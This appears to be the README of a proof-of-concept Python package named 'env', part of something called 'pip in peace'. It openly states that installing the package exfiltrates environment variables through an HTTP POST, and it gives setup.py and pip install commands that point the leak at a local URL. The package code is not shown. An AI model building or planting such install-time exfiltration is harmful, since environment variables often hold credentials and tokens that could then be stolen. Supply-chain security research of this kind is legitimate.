pip in peace - env
==================

The env package exfiltrates environment variables via HTTP POST request. Currently requires requests to be installed, but I'm too lazy to write it in urllib currently.

setup.py
--------

```
    python3 setup.py install --url=http://127.0.0.1:12345
```

pip
---

```
    pip3 install . --install-option='--url=http://127.0.0.1:12345'
```
